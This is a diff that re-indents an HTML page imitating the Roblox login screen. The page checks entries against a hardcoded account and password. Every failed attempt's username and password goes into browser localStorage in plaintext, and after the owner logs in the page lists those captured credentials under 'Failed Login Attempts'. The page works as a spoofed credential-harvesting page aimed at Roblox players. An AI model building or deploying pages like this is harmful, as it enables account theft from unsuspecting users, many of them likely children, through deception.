@@ -1,293 +1,293 @@
-   <!DOCTYPE html>
-   <html lang="en">
-   <head>
-     <meta charset="UTF-8">
-     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-     <title>Roblox Login</title>
-     <script src="https://cdn.tailwindcss.com"></script>
-     <style>
-       body {
-         margin: 0;
-         font-family: 'Segoe UI', sans-serif;
-         background-color: #1c1c1c;
-         color: white;
-         display: flex;
-         justify-content: center;
-         align-items: center;
-         height: 100vh;
-         transition: background-color 0.5s ease;
-       }
-       
-       .login-container {
-         background-color: #2c2c2c;
-         padding: 40px;
-         border-radius: 8px;
-         width: 300px;
-         text-align: center;
-         box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
-         transition: transform 0.3s ease, opacity 0.3s ease;
-       }
-       
-       .login-container.hidden {
-         display: none;
-       }
-       
-       input {
-         width: 100%;
-         padding: 12px;
-         margin: 10px 0;
-         border: none;
-         border-radius: 4px;
-         background-color: #3a3a3a;
-         color: white;
-         font-size: 14px;
-       }
-       
-       button {
-         width: 100%;
-         padding: 12px;
-         background-color: #00a2ff;
-         border: none;
-         color: white;
-         margin-top: 10px;
-         cursor: pointer;
-         border-radius: 4px;
-         font-weight: bold;
-         transition: background-color 0.2s ease;
-       }
-       
-       button:hover {
-         background-color: #0088d4;
-       }
-       
-       button:disabled {
-         background-color: #4a4a4a;
-         cursor: not-allowed;
-       }
-       
-       .links {
-         margin: 15px 0;
-         font-size: 14px;
-       }
-       
-       a {
-         color: #4db8ff;
-         text-decoration: none;
-       }
-       
-       a:hover {
-         text-decoration: underline;
-       }
-       
-       .welcome-container {
-         display: none;
-         text-align: center;
-         max-width: 600px;
-         padding: 40px;
-         background-color: #2c2c2c;
-         border-radius: 8px;
-         box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
-       }
-       
-       .welcome-container.show {
-         display: block;
-       }
-       
-       .avatar {
-         width: 150px;
-         height: 150px;
-         border-radius: 50%;
-         margin: 0 auto 20px;
-         object-fit: cover;
-         border: 4px solid #00a2ff;
-       }
-       
-       .game-grid {
-         display: grid;
-         grid-template-columns: repeat(3, 1fr);
-         gap: 20px;
-         margin-top: 30px;
-       }
-       
-       .game-card {
-         background-color: #3a3a3a;
-         border-radius: 8px;
-         overflow: hidden;
-         transition: transform 0.3s ease;
-       }
-       
-       .game-card:hover {
-         transform: translateY(-5px);
-       }
-       
-       .game-image {
-         width: 100%;
-         height: 120px;
-         object-fit: cover;
-       }
-       
-       .game-title {
-         padding: 10px;
-         font-size: 14px;
-       }
-       
-       .logout-btn {
-         margin-top: 30px;
-         background-color: #ff3d3d;
-       }
-       
-       .logout-btn:hover {
-         background-color: #d43636;
-       }
-       
-       .error-message {
-         color: #ff6b6b;
-         font-size: 14px;
-         margin-top: 10px;
-         display: none;
-       }
-     </style>
-   </head>
-   <body>
-     <div class="login-container" id="loginContainer">
-       <h2 class="text-2xl font-bold mb-6">Login to Roblox</h2>
-       <form id="loginForm">
-         <input type="text" id="username" placeholder="Username/Email/Phone" required>
-         <div style="position: relative;">
-           <input type="password" id="password" placeholder="Password" required>
-           <span id="togglePassword" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer;">
-             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-               <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-               <circle cx="12" cy="12" r="3"></circle>
-             </svg>
-           </span>
-         </div>
-         <div class="error-message" id="errorMessage"></div>
-         <button type="submit">Log In</button>
-       </form>
-       <div class="links">
-         <a href="#">Forgot Password or Username?</a>
-         <button disabled>Email Me a One-Time Code</button>
-         <button disabled>Use Another Device</button>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Roblox Login</title>
+   <script src="https://cdn.tailwindcss.com"></script>
+   <style>
+     body {
+       margin: 0;
+       font-family: 'Segoe UI', sans-serif;
+       background-color: #1c1c1c;
+       color: white;
+       display: flex;
+       justify-content: center;
+       align-items: center;
+       height: 100vh;
+       transition: background-color 0.5s ease;
+     }
+     
+     .login-container {
+       background-color: #2c2c2c;
+       padding: 40px;
+       border-radius: 8px;
+       width: 300px;
+       text-align: center;
+       box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+       transition: transform 0.3s ease, opacity 0.3s ease;
+     }
+     
+     .login-container.hidden {
+       display: none;
+     }
+     
+     input {
+       width: 100%;
+       padding: 12px;
+       margin: 10px 0;
+       border: none;
+       border-radius: 4px;
+       background-color: #3a3a3a;
+       color: white;
+       font-size: 14px;
+     }
+     
+     button {
+       width: 100%;
+       padding: 12px;
+       background-color: #00a2ff;
+       border: none;
+       color: white;
+       margin-top: 10px;
+       cursor: pointer;
+       border-radius: 4px;
+       font-weight: bold;
+       transition: background-color 0.2s ease;
+     }
+     
+     button:hover {
+       background-color: #0088d4;
+     }
+     
+     button:disabled {
+       background-color: #4a4a4a;
+       cursor: not-allowed;
+     }
+     
+     .links {
+       margin: 15px 0;
+       font-size: 14px;
+     }
+     
+     a {
+       color: #4db8ff;
+       text-decoration: none;
+     }
+     
+     a:hover {
+       text-decoration: underline;
+     }
+     
+     .welcome-container {
+       display: none;
+       text-align: center;
+       max-width: 600px;
+       padding: 40px;
+       background-color: #2c2c2c;
+       border-radius: 8px;
+       box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+     }
+     
+     .welcome-container.show {
+       display: block;
+     }
+     
+     .avatar {
+       width: 150px;
+       height: 150px;
+       border-radius: 50%;
+       margin: 0 auto 20px;
+       object-fit: cover;
+       border: 4px solid #00a2ff;
+     }
+     
+     .game-grid {
+       display: grid;
+       grid-template-columns: repeat(3, 1fr);
+       gap: 20px;
+       margin-top: 30px;
+     }
+     
+     .game-card {
+       background-color: #3a3a3a;
+       border-radius: 8px;
+       overflow: hidden;
+       transition: transform 0.3s ease;
+     }
+     
+     .game-card:hover {
+       transform: translateY(-5px);
+     }
+     
+     .game-image {
+       width: 100%;
+       height: 120px;
+       object-fit: cover;
+     }
+     
+     .game-title {
+       padding: 10px;
+       font-size: 14px;
+     }
+     
+     .logout-btn {
+       margin-top: 30px;
+       background-color: #ff3d3d;
+     }
+     
+     .logout-btn:hover {
+       background-color: #d43636;
+     }
+     
+     .error-message {
+       color: #ff6b6b;
+       font-size: 14px;
+       margin-top: 10px;
+       display: none;
+     }
+   </style>
+</head>
+<body>
+   <div class="login-container" id="loginContainer">
+     <h2 class="text-2xl font-bold mb-6">Login to Roblox</h2>
+     <form id="loginForm">
+       <input type="text" id="username" placeholder="Username/Email/Phone" required>
+       <div style="position: relative;">
+         <input type="password" id="password" placeholder="Password" required>
+         <span id="togglePassword" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer;">
+           <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+             <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+             <circle cx="12" cy="12" r="3"></circle>
+           </svg>
+         </span>
        </div>
-       <p class="mt-4">Don't have an account? <a href="#">Sign Up</a></p>
+       <div class="error-message" id="errorMessage"></div>
+       <button type="submit">Log In</button>
+     </form>
+     <div class="links">
+       <a href="#">Forgot Password or Username?</a>
+       <button disabled>Email Me a One-Time Code</button>
+       <button disabled>Use Another Device</button>
      </div>
+     <p class="mt-4">Don't have an account? <a href="#">Sign Up</a></p>
+   </div>
 
-     <div class="welcome-container" id="welcomeContainer">
-       <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/c9b62707-656f-4880-94fa-e0535ede91ea.png" alt="Roblox avatar of wholettheishansout with blue shirt and black hair" class="avatar">
-       <h1 class="text-3xl font-bold mb-2">Welcome back, wholettheishansout!</h1>
-       <p class="mb-6">What would you like to play today?</p>
-       
-       <div class="game-grid">
-         <div class="game-card">
-           <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/69d08826-e780-491d-a922-eb7b94c5c0e1.png" alt="Adopt Me game thumbnail showing pets and houses" class="game-image">
-           <div class="game-title">Adopt Me</div>
-         </div>
-         <div class="game-card">
-           <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/dead75f8-1d71-4be2-803e-426fab9ff22f.png" alt="Brookhaven RP game thumbnail showing city scene" class="game-image">
-           <div class="game-title">Brookhaven RP</div>
-         </div>
-         <div class="game-card">
-           <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/42ae604d-d579-41ba-9141-5868bf1ecbe4.png" alt="Tower of Hell game thumbnail showing obstacle course" class="game-image">
-           <div class="game-title">Tower of Hell</div>
-         </div>
-         <div class="game-card">
-           <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/227c2f1e-ee5f-4876-9859-69665c8a5768.png" alt="Murder Mystery 2 game thumbnail showing weapons" class="game-image">
-           <div class="game-title">Murder Mystery 2</div>
-         </div>
-         <div class="game-card">
-           <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/aae2ba1f-d627-491f-a4c8-a6d927145f84.png" alt="Jailbreak game thumbnail showing police cars" class="game-image">
-           <div class="game-title">Jailbreak</div>
-         </div>
-         <div class="game-card">
-           <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/8f214284-aaea-4aaa-86f0-bb4463ecb5d7.png" alt="Blox Fruits game thumbnail showing anime characters" class="game-image">
-           <div class="game-title">Blox Fruits</div>
-         </div>
+   <div class="welcome-container" id="welcomeContainer">
+     <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/c9b62707-656f-4880-94fa-e0535ede91ea.png" alt="Roblox avatar of wholettheishansout with blue shirt and black hair" class="avatar">
+     <h1 class="text-3xl font-bold mb-2">Welcome back, wholettheishansout!</h1>
+     <p class="mb-6">What would you like to play today?</p>
+     
+     <div class="game-grid">
+       <div class="game-card">
+         <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/69d08826-e780-491d-a922-eb7b94c5c0e1.png" alt="Adopt Me game thumbnail showing pets and houses" class="game-image">
+         <div class="game-title">Adopt Me</div>
        </div>
-       
-       <button class="logout-btn" id="logoutBtn">Log Out</button>
-       
-       <div class="failed-attempts" id="failedAttempts" style="margin-top: 30px; background: #3a3a3a; padding: 15px; border-radius: 8px; display: none;">
-         <h3 class="text-xl font-bold mb-3">Failed Login Attempts</h3>
-         <div id="attemptsList"></div>
+       <div class="game-card">
+         <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/dead75f8-1d71-4be2-803e-426fab9ff22f.png" alt="Brookhaven RP game thumbnail showing city scene" class="game-image">
+         <div class="game-title">Brookhaven RP</div>
+       </div>
+       <div class="game-card">
+         <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/42ae604d-d579-41ba-9141-5868bf1ecbe4.png" alt="Tower of Hell game thumbnail showing obstacle course" class="game-image">
+         <div class="game-title">Tower of Hell</div>
+       </div>
+       <div class="game-card">
+         <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/227c2f1e-ee5f-4876-9859-69665c8a5768.png" alt="Murder Mystery 2 game thumbnail showing weapons" class="game-image">
+         <div class="game-title">Murder Mystery 2</div>
+       </div>
+       <div class="game-card">
+         <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/aae2ba1f-d627-491f-a4c8-a6d927145f84.png" alt="Jailbreak game thumbnail showing police cars" class="game-image">
+         <div class="game-title">Jailbreak</div>
+       </div>
+       <div class="game-card">
+         <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/8f214284-aaea-4aaa-86f0-bb4463ecb5d7.png" alt="Blox Fruits game thumbnail showing anime characters" class="game-image">
+         <div class="game-title">Blox Fruits</div>
        </div>
      </div>
+     
+     <button class="logout-btn" id="logoutBtn">Log Out</button>
+     
+     <div class="failed-attempts" id="failedAttempts" style="margin-top: 30px; background: #3a3a3a; padding: 15px; border-radius: 8px; display: none;">
+       <h3 class="text-xl font-bold mb-3">Failed Login Attempts</h3>
+       <div id="attemptsList"></div>
+     </div>
+   </div>
 
-     <script>
-       let failedAttempts = JSON.parse(localStorage.getItem('failedLoginAttempts')) || [];
+   <script>
+     let failedAttempts = JSON.parse(localStorage.getItem('failedLoginAttempts')) || [];
+     
+     // Password visibility toggle
+     document.getElementById('togglePassword').addEventListener('click', function() {
+       const passwordInput = document.getElementById('password');
+       const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+       passwordInput.setAttribute('type', type);
        
-       // Password visibility toggle
-       document.getElementById('togglePassword').addEventListener('click', function() {
-         const passwordInput = document.getElementById('password');
-         const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-         passwordInput.setAttribute('type', type);
-         
-         // Toggle eye icon
-         this.innerHTML = type === 'password' ? 
-           '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>' :
-           '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>';
-       });
-       
-       // Display any existing failed attempts on page load
+       // Toggle eye icon
+       this.innerHTML = type === 'password' ? 
+         '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>' :
+         '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>';
+     });
+     
+     // Display any existing failed attempts on page load
+     if (failedAttempts.length > 0) {
+       displayFailedAttempts();
+     }
+     
+     function displayFailedAttempts() {
        if (failedAttempts.length > 0) {
-         displayFailedAttempts();
+         const attemptsList = document.getElementById('attemptsList');
+         attemptsList.innerHTML = failedAttempts.map(attempt => 
+           `<div class="attempt-item" style="margin-bottom: 8px;">
+             <span style="color: #ff6b6b">Username: ${attempt.username}</span>,
+             Password: ${attempt.password}
+           </div>`
+         ).join('');
+         document.getElementById('failedAttempts').style.display = 'block';
        }
-       
-       function displayFailedAttempts() {
-         if (failedAttempts.length > 0) {
-           const attemptsList = document.getElementById('attemptsList');
-           attemptsList.innerHTML = failedAttempts.map(attempt => 
-             `<div class="attempt-item" style="margin-bottom: 8px;">
-               <span style="color: #ff6b6b">Username: ${attempt.username}</span>,
-               Password: ${attempt.password}
-             </div>`
-           ).join('');
-           document.getElementById('failedAttempts').style.display = 'block';
-         }
-       }
+     }
 
-       document.getElementById('loginForm').addEventListener('submit', function(e) {
-         e.preventDefault();
-         
-         const username = document.getElementById('username').value;
-         const password = document.getElementById('password').value;
-         const errorMessage = document.getElementById('errorMessage');
-         
-         // Check credentials
-         if (username === 'wholettheishansout' && password === 'ishanbojja') {
-           // Show failed attempts if any
-           displayFailedAttempts();
-           // Successful login
-           document.getElementById('loginContainer').classList.add('hidden');
-           document.getElementById('welcomeContainer').classList.add('show');
-           
-           // Change background color for welcome page
-           document.body.style.backgroundColor = '#121212';
-         } else {
-           // Failed login
-           errorMessage.textContent = 'Incorrect username or password. Please try again.';
-           errorMessage.style.display = 'block';
-           failedAttempts.push({
-             username: username,
-             password: password
-           });
-           localStorage.setItem('failedLoginAttempts', JSON.stringify(failedAttempts));
-         }
-       });
+     document.getElementById('loginForm').addEventListener('submit', function(e) {
+       e.preventDefault();
        
-       document.getElementById('logoutBtn').addEventListener('click', function() {
-         document.getElementById('loginContainer').classList.remove('hidden');
-         document.getElementById('welcomeContainer').classList.remove('show');
-         document.body.style.backgroundColor = '#1c1c1c';
+       const username = document.getElementById('username').value;
+       const password = document.getElementById('password').value;
+       const errorMessage = document.getElementById('errorMessage');
+       
+       // Check credentials
+       if (username === 'wholettheishansout' && password === 'ishanbojja') {
+         // Show failed attempts if any
+         displayFailedAttempts();
+         // Successful login
+         document.getElementById('loginContainer').classList.add('hidden');
+         document.getElementById('welcomeContainer').classList.add('show');
          
-         // Clear form fields and attempts
-         document.getElementById('username').value = '';
-         document.getElementById('password').value = '';
-         document.getElementById('errorMessage').style.display = 'none';
-         document.getElementById('failedAttempts').style.display = 'none';
-         failedAttempts = [];
-         localStorage.removeItem('failedLoginAttempts');
-       });
-     </script>
-   </body>
-   </html>
+         // Change background color for welcome page
+         document.body.style.backgroundColor = '#121212';
+       } else {
+         // Failed login
+         errorMessage.textContent = 'Incorrect username or password. Please try again.';
+         errorMessage.style.display = 'block';
+         failedAttempts.push({
+           username: username,
+           password: password
+         });
+         localStorage.setItem('failedLoginAttempts', JSON.stringify(failedAttempts));
+       }
+     });
+     
+     document.getElementById('logoutBtn').addEventListener('click', function() {
+       document.getElementById('loginContainer').classList.remove('hidden');
+       document.getElementById('welcomeContainer').classList.remove('show');
+       document.body.style.backgroundColor = '#1c1c1c';
+       
+       // Clear form fields and attempts
+       document.getElementById('username').value = '';
+       document.getElementById('password').value = '';
+       document.getElementById('errorMessage').style.display = 'none';
+       document.getElementById('failedAttempts').style.display = 'none';
+       failedAttempts = [];
+       localStorage.removeItem('failedLoginAttempts');
+     });
+   </script>
+</body>
+</html>
